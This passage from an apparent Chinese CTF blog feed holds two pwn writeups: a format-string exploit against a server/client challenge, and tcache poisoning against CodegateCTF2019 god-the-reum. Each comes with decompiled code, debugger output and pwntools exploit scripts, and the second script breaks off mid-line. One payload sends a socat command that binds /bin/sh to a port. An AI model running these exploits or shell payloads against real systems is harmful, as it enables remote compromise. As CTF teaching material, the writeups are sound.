class="code"><pre><span class="line">.text:0000000000404CA9 ; 7:   v5 = *((_QWORD *)a2 + 1);                     // send_data</span><br><span class="line">.text:0000000000404CA9                 mov     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000404CAD                 mov     rax, [rax+8]</span><br><span class="line">.text:0000000000404CB1                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000404CB5 ; 8:   if ( *(_QWORD *)&amp;a2[2 * (*(unsigned int *)(v5 + 4) + 4LL) + 2] )</span><br><span class="line">.text:0000000000404CB5                 mov     rax, [rbp+var_8]</span><br><span class="line">.text:0000000000404CB9                 mov     edx, [rax+4]   ;; send_data-&gt;action</span><br><span class="line">.text:0000000000404CBC                 mov     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000404CC0                 mov     edx, edx</span><br><span class="line">.text:0000000000404CC2                 add     rdx, 4</span><br><span class="line">.text:0000000000404CC6                 mov     rax, [rax+rdx*8+8]</span><br><span class="line">.text:0000000000404CCB                 test    rax, rax</span><br></pre></td></tr></table></figure><p>同时检查一下<code>a2</code>中存放了什么数据，根据调试的结果，可以推测<code>send_msg</code>的第二个参数用于选择对应的功能模块，而<code>action=0</code>就是login的操作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/32gx 0x6d8590</span><br><span class="line">0x6d8590:       0x0000000000000007      0x00000000006d6480</span><br><span class="line">0x6d85a0:       0x0000000000000000      0x0000001200000000</span><br><span class="line">0x6d85b0:       0x0000000000000012      0x0000000000405445</span><br><span class="line">0x6d85c0:       0x0000000000000000      0x0000000000405c96</span><br><span class="line">0x6d85d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6d85e0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6d85f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6d8600:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6d8610:       0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x 0x0000000000405445</span><br><span class="line">0x405445 &lt;login&gt;:       0x70ec8348e5894855</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x 0x0000000000405c96</span><br><span class="line">0x405c96 &lt;create_account&gt;:      0x40ec8348e5894855</span><br></pre></td></tr></table></figure><p>那么只要我们根据client登录数据包的结构，构造一个数据包，控制<code>send_data</code>的<code>action</code>参数，让<code>[rax+rdx*8+8]</code>落在空白处，程序就会判断不存在该功能，并进入<code>else</code>分支，到格式化字符串漏洞的地方。现在，可以不用管client了，直接构造一个<code>action</code>大于2的数据包进行调试，代码修改如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">6210</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(action, payload)</span>:</span></span><br><span class="line">    p.send(p32(len(payload)) + p32(action) + payload)</span><br><span class="line"></span><br><span class="line">send_payload(<span class="number">3</span>,<span class="string">'aaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190305193054-23443a90-3f3a-1.png" alt=""></p><p>发现输入的数据包存在栈中，那么利用就很简单了。接着就是常规的格式化字符串漏洞利用套路，修改<code>printf@got.plt</code>为<code>system@plt</code>。</p><p>尝试了各种的反弹shell姿势都无效，用curl和wget回传flag也没反应，最后用socat开了一个正向shell，成功连上~</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190305193106-2aa4569e-3f3a-1.png" alt=""></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span> </span><br><span class="line">elf = ELF(<span class="string">'./server'</span>)</span><br><span class="line">p = remote(<span class="string">'172.30.0.2'</span>, <span class="number">6210</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(action, payload)</span>:</span></span><br><span class="line">    p.send(p32(len(payload)) + p32(action) + payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">byte = []</span><br><span class="line">offset = <span class="number">15</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">6</span>): </span><br><span class="line">    a = elf.got[<span class="string">'printf'</span>] + x</span><br><span class="line">    b = elf.plt[<span class="string">'system'</span>] &gt;&gt; <span class="number">8</span> * x  &amp; <span class="number">0xff</span></span><br><span class="line">    byte.append((b,a))</span><br><span class="line">byte.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>],reverse=<span class="keyword">False</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> byte:</span><br><span class="line">    tmp = y[<span class="number">0</span>]-count</span><br><span class="line">    <span class="keyword">if</span> tmp &lt; <span class="number">0</span>: tmp += <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">    payload += <span class="string">'%&#123;&#125;$hhn'</span>.format(offset+<span class="number">9</span>+n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hhn'</span>.format(tmp,offset+<span class="number">9</span>+n)</span><br><span class="line">    count += tmp</span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line">payload = payload.ljust(<span class="number">72</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> byte:</span><br><span class="line">    payload += p64(z[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">send_payload(<span class="number">3</span>,payload)</span><br><span class="line">send_payload(<span class="number">3</span>,<span class="string">'socat TCP-LISTEN:23333,reuseaddr,fork EXEC:"/bin/sh"\x00'</span>)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>VeggieTales是一个常规的pickle反序列化，以往CTF一般是放在web题中。pwn6的server/client题型很新颖，虽然漏洞利用不难，不过调试过程还是踩了不少坑，题目质量不错，值得学习一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知论坛 &lt;a href=&quot;https://xz.aliyun.com/t/4327&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4327&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwn1-5的题目不难，之前已经有
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache在pwn题中常见的利用姿势</title>
    <link href="https://4f-kira.github.io/2019/05/31/tcahe-pwn/"/>
    <id>https://4f-kira.github.io/2019/05/31/tcahe-pwn/</id>
    <published>2019-05-31T02:12:10.000Z</published>
    <updated>2019-05-31T02:17:03.762Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知论坛 <a href="https://xz.aliyun.com/t/4102" target="_blank" rel="noopener">https://xz.aliyun.com/t/4102</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>tcache是 glibc 2.26(ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能，最近tcache机制的pwn题越来越多，趁着春节放假，学习了一下tcache在pwn题中是如何利用的。下面通过几条tcache的题目，分享下此类题目常规利用姿势。</p><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p>链接: <a href="https://pan.baidu.com/s/11EIvOiNOsFTFWavScsR7eQ" target="_blank" rel="noopener">https://pan.baidu.com/s/11EIvOiNOsFTFWavScsR7eQ</a> 提取码: vter</p><p>需要使用Ubuntu17.04以上版本进行练习。</p><h2 id="tcache基础知识"><a href="#tcache基础知识" class="headerlink" title="tcache基础知识"></a>tcache基础知识</h2><p>tcache的介绍可以参考CTFwiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/</a> ，或者各大师傅的博客，都有详尽的介绍，在此我就不多赘述了。</p><h2 id="CodegateCTF2019-god-the-reum"><a href="#CodegateCTF2019-god-the-reum" class="headerlink" title="CodegateCTF2019 god-the-reum"></a>CodegateCTF2019 god-the-reum</h2><p>打开程序看一下，是个经典的菜单程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">====== Ethereum wallet service ========</span><br><span class="line">1. Create new wallet</span><br><span class="line">2. Deposit eth</span><br><span class="line">3. Withdraw eth</span><br><span class="line">4. Show all wallets</span><br><span class="line">5. exit</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">88</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="built_in">stdin</span>;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        v3 = &amp;v5[<span class="number">16</span> * dword_20202C];</span><br><span class="line">        create((<span class="keyword">void</span> **)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        v3 = &amp;v5[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_11DC(v3)];</span><br><span class="line">        deposit((__int64)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        v3 = &amp;v5[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_11DC(v3)];</span><br><span class="line">        withdraw((__int64)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        v3 = v5;</span><br><span class="line">        show((__int64)v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"bye da."</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        v3 = &amp;v5[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_11DC(v3)];</span><br><span class="line">        developer((__int64)v3);  <span class="comment">// 隐藏功能</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_11B3((__int64)v3, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单功能如下：</p><ol><li>Create new wallet：创建一个wallet，可控制size，malloc一个chunk用于存放ballance</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">create</span><span class="params">(<span class="keyword">void</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+13h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+13h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x82</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !s || dword_20202C &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wallet creation failed"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x82</span>uLL);</span><br><span class="line">  v1 = (<span class="keyword">char</span> *)s + <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s);</span><br><span class="line">  *(_WORD *)v1 = 'x0';</span><br><span class="line">  v1[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">39</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = rand() % <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">9</span> )</span><br><span class="line">      v5 = rand() % <span class="number">6</span> + <span class="number">97</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = v4 + <span class="number">48</span>;</span><br><span class="line">    *((_BYTE *)s + i + <span class="number">2</span>) = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = s;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"how much initial eth? : "</span>, <span class="number">0L</span>L);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llu"</span>, &amp;size);</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">1</span>] )</span><br><span class="line">    *(_QWORD *)a1[<span class="number">1</span>] = size;</span><br><span class="line">  ++dword_20202C;</span><br><span class="line">  sub_119B();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Creating new wallet succcess !\n"</span>);</span><br><span class="line">  sub_FD5(*a1, a1[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>Deposit eth：增加wallet的ballance（本题中用不到）</p></li><li><p>Withdraw eth：减少wallet的金钱，如果当前ballance为0，则free掉ballance的chunk，可<code>double free</code></p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">withdraw</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"how much you wanna withdraw? : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llu"</span>, &amp;v2);</span><br><span class="line">  **(_QWORD **)(a1 + <span class="number">8</span>) -= v2;</span><br><span class="line">  <span class="keyword">if</span> ( !**(_QWORD **)(a1 + <span class="number">8</span>) )  <span class="comment">// 判断是否为0</span></span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(a1 + <span class="number">8</span>));    <span class="comment">// double free</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"withdraw ok !\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Show all wallets：打印wallet信息，没有任何检查，存在UAF漏洞。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">show</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_119B();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"========== My Wallet List ============="</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_20202C; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d) "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">    sub_FD5(*(_QWORD *)(<span class="number">16L</span>L * i + a1), *(_QWORD *)(<span class="number">16L</span>L * i + a1 + <span class="number">8</span>)); <span class="comment">// printf("addr : %s, ballance %llu\n", a1, *a2, a1, a2);</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>输入<code>6</code>可以进入一个developer的隐藏功能，可对ballance进行修改。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">developer</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_119B();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"this menu is only for developer"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"if you are not developer, please get out"</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"new eth : "</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">"%10s"</span>, *(_QWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目分析：</p><ol><li>首先需要泄露libc地址，方法有两个，需要利用<code>tcache</code>的特点</li></ol><ul><li>默认情况下，单链表个数是64个，可容纳的最大内存块大小是1032（0x408）</li><li>单个tcache bins默认最多包含7个块</li></ul><p>方法一：那么，只要我们创建一个大于0x408的chunk，free掉之后就能进入unsorted bins，然后泄露libc地址的方法就与glibc 2.23以下版本一样。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104424-70274be6-3002-1.png" alt=""></p><p>方法二：先把tcache bins填满，一般情况就是7个，之后free掉的chunk就能进入unsorted bin了。利用<code>double free</code>把<code>tcache</code>填满7个后，泄露libc地址。注意首次<code>double free</code>后金额变成heap地址，可以用show功能打印ballance，然后继续<code>double free</code>。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104452-80cd641c-3002-1.png" alt=""></p><ol><li>使用<code>tcache poisoning</code>进行任意地址写</li></ol><p><code>tache posioning</code> 和 <code>fastbin attack</code>类似，而且限制更加少，不会检查size，直接修改 <code>tcache</code> 中的 fd，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。创建一个不大于<code>0x408</code>的chunk，free掉后即可进入<code>tcache</code>，利用developer的隐藏功能，可以修改<code>tcache</code>的fd为<code>free_hook</code>的地址，进行两次分配后，即可分配到<code>free_hook</code>的地址，再次使用developer的隐藏功能直接把<code>free_hook</code>改成<code>system</code>或者<code>onegadget</code>即可getshell。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./god-the-reum'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(n)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'select your choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'initial eth? : '</span>,str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">withdraw</span><span class="params">(idx,n)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'select your choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'wallet no : '</span>,str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'withdraw? : '</span>,str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'select your choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">developer</span><span class="params">(idx,n)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'select your choice :'</span>,<span class="string">'6'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'wallet no : '</span>,str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'new eth : '</span>,str(n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc addr</span></span><br><span class="line">create(<span class="number">0x100</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x90</span>) <span class="comment"># 1</span></span><br><span class="line">withdraw(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">withdraw(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'ballance '</span>)</span><br><span class="line">heap_addr = int(p.recvuntil(<span class="string">'\n'</span>).strip())</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">withdraw(<span class="number">0</span>,heap_addr)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'ballance '</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'\n'</span>).strip()) - <span class="number">0x3ebc40</span> - <span class="number">96</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># overwrite free_hook to onegadget</span></span><br><span class="line">withdraw(<span class="number">1</span>,<span class="number">0x90</span>)</span><br><span class="line">developer(<span 